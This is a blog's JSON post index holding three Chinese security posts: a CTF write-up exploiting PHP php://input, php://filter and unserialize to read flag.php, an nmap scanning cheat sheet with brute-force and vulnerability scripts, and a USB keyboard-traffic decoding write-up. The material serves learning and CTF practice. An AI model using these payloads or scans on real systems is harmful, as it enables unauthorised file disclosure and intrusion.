{"meta":{"title":"aT0ngMu是个小机灵鬼儿づ￣3￣","subtitle":null,"description":null,"author":"aT0ngMu","url":"https://at0ngmu.github.io"},"pages":[{"title":"404","date":"2018-11-18T12:02:52.000Z","updated":"2018-11-18T12:02:52.580Z","comments":true,"path":"404/index.html","permalink":"https://at0ngmu.github.io/404/index.html","excerpt":"","text":""},{"title":"about","date":"2018-11-19T01:46:12.000Z","updated":"2018-11-19T01:47:32.604Z","comments":true,"path":"about/index.html","permalink":"https://at0ngmu.github.io/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-11-18T13:22:33.000Z","updated":"2018-11-18T13:23:19.579Z","comments":true,"path":"categories/index.html","permalink":"https://at0ngmu.github.io/categories/index.html","excerpt":"","text":""},{"title":"search","date":"2018-11-18T12:02:42.000Z","updated":"2018-11-18T12:02:42.770Z","comments":true,"path":"search/index.html","permalink":"https://at0ngmu.github.io/search/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-11-18T13:20:51.000Z","updated":"2018-11-18T13:21:36.346Z","comments":true,"path":"tags/index.html","permalink":"https://at0ngmu.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"记一道集PHP伪协议&PHP反序列化综合运用的CTF","slug":"记一道集PHP伪协议-PHP反序列化综合运用的CTF","date":"2018-11-19T07:45:01.000Z","updated":"2018-11-19T08:23:30.481Z","comments":true,"path":"2018/11/19/记一道集PHP伪协议-PHP反序列化综合运用的CTF/","link":"","permalink":"https://at0ngmu.github.io/2018/11/19/记一道集PHP伪协议-PHP反序列化综合运用的CTF/","excerpt":"","text":"题目链接首先拿到题目后，毫无疑问，查看一下源码&lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php }else{ echo &quot;you are not admin ! &quot;; } --&gt; 解读一下源码的意思：1.get方式传入三个参数：txt，file，password2.file_get_contents()函数的作用是将$user的内容读取出来，在此即为将user读取出来的内容数值与类型完全等于welcome to the bugkuctf。（三个等于号）3.如果满足if条件，则打印输出”hello admin!”。并且将包含的hint.php内容显示出来 在此，可以运用两个PHP的伪协议* php://filter 可以进行任意文件的读取。有关php://filter的详细了解* php://input 可以读取没有处理过的post数据通过对以上代码的分析，我们有了解决思路：* 对于file_get_contents($user,’r’)===”welcome to the bugkuctf”，我们可以借用php伪协议php://input，要想使user中的字符串读取出来与三等号后的内容一致，就必须使他的传入参数txt，来post welcome to the bugkuctf* 再来看include($file); //hint.php 我们可以用php://filter来进行hint.php的base编码，从而可以读取出hint.php的base编码，从而可以读取出hint.php的内容。构造payload:index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php 利用bp改包 得到回显 发现一组base64,再进行base64解码，发现又有一组代码#hint.php &lt;?php class Flag{//flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); } } } ?&gt; 再来分析这段代码看到flag.php，猜测flag或许就从这段代码中找出。发现了比较关键的一个函数tostring(),此函数的作用是将Flag类作为字符串执行时会自动执行此函数，并且将变量$file作为文件名输出文件内容。但是，这个时候发现并没有代码显示可以调用这个类，如果没有调用这个类，也就无法执行tostring()函数。而且，还有一个password参数没有用上，所以考虑，或许还会存在另一段代码。那就接着上一步，把hint.php换成index.php会有什么发现呢？果不其然，确实又有了重大发现： 再次得到回显 解码后index.php &lt;?php $txt = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $password = $_GET[&quot;password&quot;]; if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello friend!&lt;br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;ä¸è½ç°å¨å°±ç»ä½ flagå¦&quot;; exit(); }else{ include($file); $password = unserialize($password); echo $password; } }else{ echo &quot;you are not the number of bugku ! &quot;; } ?&gt; &lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php }else{ echo &quot;you are not admin ! &quot;; } --&gt; 结果发现了正则匹配函数preg_match(“/flag/“,$file)，对flag进行了正则匹配。再来接着看，else代码块中又一次包含了$file,并且对$password进行反序列化。通过对上述hint.php的解读，我们就可以构造password，password为Flag类型，字符串变量file=flag.php。构造的序列化对象payload，password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} 在这里简单说一下php的反序列化将原来的某个对象进行序列化之后，从序列化后的结果中就可以知道这个对象的具体类型和值在这里简单说一下序列化后的几个字母的意思，以password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}为例* O（大写）：对象class* 4：4个字符* “Flag”：对象名* 1：数量，一个* s：string* {}里的为参数反序列化可以理解为序列化的的逆运算","categories":[{"name":"CTF","slug":"CTF","permalink":"https://at0ngmu.github.io/categories/CTF/"}],"tags":[{"name":"PHP伪协议","slug":"PHP伪协议","permalink":"https://at0ngmu.github.io/tags/PHP伪协议/"},{"name":"反序列化","slug":"反序列化","permalink":"https://at0ngmu.github.io/tags/反序列化/"}]},{"title":"信息收集之nmap","slug":"信息收集之nmap常用命令","date":"2018-11-19T07:26:49.000Z","updated":"2018-11-19T07:41:27.769Z","comments":true,"path":"2018/11/19/信息收集之nmap常用命令/","link":"","permalink":"https://at0ngmu.github.io/2018/11/19/信息收集之nmap常用命令/","excerpt":"","text":"探测主机存活常用方式扫描网段主机：进行ping扫描nmap -sP 192.168.181.50/100 扫描单个主机nmap 192.168.181.50 发送tcp的ack包探测主机是否存活nmap 192.168.181.50 -sA 半开放扫描，不会被目标主机记入系统日志，但须root权限nmap -sS 192.168.181.50 三次握手tcp扫描易被目标主机检测到，但不需root权限nmap -sT 192.168.181.50 另一目标主机对主机发送数据，获取主机ipnmap -sL 192.168.181.50 扫描UDP端口nmap -sU 192.168.181.50 版本检测nmap -sV 192.168.181.50 操作系统检测namp -O 192.168.181.50 -PN绕过ping命令nmap -O -PN 192.168.181.50 检测是否存在常见漏洞nmap --script=vuln 192.168.181.50 在局域网扫描主机特定端口-n加快扫描速度nmap -n -p445 --script=broadast 192.168.181.50 nmap脚本使用nmap脚本扫描时可设置”–script=类别”的方式进行扫描auth:可作为检测部分应用弱口令，也可负责处理鉴权证书（绕开鉴权）的脚本。nmap --script=auth 192.168.181.129 broadcast:局域网内探测服务开启情况，如dhcp/dns/sqlserver等服务.nmap -n -p445 --script=broadcast 192.168.181.129 brute:提供暴力破解，如http/snmap等应用。提供的暴力破解方式可对数据库，smb,snmp等进行简单密码 的暴力猜解nmap --script=brute 192.168.181.129 default:提供基本脚本扫描能力。默认的脚本扫描，主要搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击nmap -sC 192.168.181.50 检查目标主机是否有常见漏洞nmap --script=vuln 192.168.181.50 external:利用第三方数据库或资源，如：whois解析nmap --script external 192.168.181.129","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://at0ngmu.github.io/categories/渗透测试/"}],"tags":[{"name":"端口扫描","slug":"端口扫描","permalink":"https://at0ngmu.github.io/tags/端口扫描/"},{"name":"信息收集","slug":"信息收集","permalink":"https://at0ngmu.github.io/tags/信息收集/"}]},{"title":"USB流量分析","slug":"USB流量分析","date":"2018-11-19T07:14:10.000Z","updated":"2018-11-19T07:20:40.514Z","comments":true,"path":"2018/11/19/USB流量分析/","link":"","permalink":"https://at0ngmu.github.io/2018/11/19/USB流量分析/","excerpt":"","text":"USB流量分析- USB接口简介通过监听USB接口流量，可获取键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。- 题目wireshark打开数据包后发现为usb协议 USB协议数据部分在Leftover Capture Data域中，使用tshark命令将其单独提取出来tshark -r udn.pcapng -T fields -e usb.capdata &gt; usbdata.txt cat命令查看分离出的usbdata.txtcat usbdata.txt 由于USB流量分为键盘流量和鼠标流量，而键盘数据包的数据长度为八个字节，鼠标数据包的数据长度为四个字节。键盘数据包击键信息集中在第三个字节，每次key stroke都会产生一个keyboard event usb packet。鼠标数据包第一个字节代表按键，当取0×00时代表没有按键；当取0×01时代表按左键；当取0×02时代表当前按键为右键。第二个字节可看作为signed byte类型，其最高位为符号位，当值为正时，代表鼠标右移像素位；值为负时，代表鼠标左移像素位。第三个字节代表垂直上下移动的偏移。此题为键盘数据包友情链接USB协议，查找值与具体键位的对应关系： http://www.usb.org/developers/hidpage/Hut1_12v2.pdf 根据第53页 usb keyboard映射表写脚本解码得出数据包 上脚本mappings = { 0x04:&quot;A&quot;, 0x05:&quot;B&quot;, 0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;, 0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;, 0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;, 0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;, 0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;\\n&quot;, 0x2a:&quot;[DEL]&quot;, 0X2B:&quot; &quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;, 0x30:&quot;]&quot;, 0x31:&quot;\\\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;, 0x34:&quot;&apos;&quot;, 0x36:&quot;,&quot;, 0x37:&quot;.&quot; } nums = [] keys = open(&apos;usbdata.txt&apos;) for line in keys: if line[0]!=&apos;0&apos; or line[1]!=&apos;0&apos; or line[3]!=&apos;0&apos; or line[4]!=&apos;0&apos; or line[9]!=&apos;0&apos; or line[10]!=&apos;0&apos; or line[12]!=&apos;0&apos; or line[13]!=&apos;0&apos; or line[15]!=&apos;0&apos; or line[16]!=&apos;0&apos; or line[18]!=&apos;0&apos; or line[19]!=&apos;0&apos; or line[21]!=&apos;0&apos; or line[22]!=&apos;0&apos;: continue nums.append(int(line[6:8],16)) keys.close() output = &quot;&quot; for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] print &apos;output :\\n&apos; + output 另附鼠标脚本nums = [] keys = open(&apos;data.txt&apos;,&apos;r&apos;) posx = 0 posy = 0 for line in keys: if len(line) != 12 : continue x = int(line[3:5],16) y = int(line[6:8],16) if x &gt; 127 : x -= 256 if y &gt; 127 : y -= 256 posx += x posy += y btn_flag = int(line[0:2],16) # 1 for left , 2 for right , 0 for nothing if btn_flag == 1 : print posx , posy keys.close()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://at0ngmu.github.io/categories/CTF/"}],"tags":[{"name":"原创","slug":"原创","permalink":"https://at0ngmu.github.io/tags/原创/"},{"name":"流量分析","slug":"流量分析","permalink":"https://at0ngmu.github.io/tags/流量分析/"}]}]}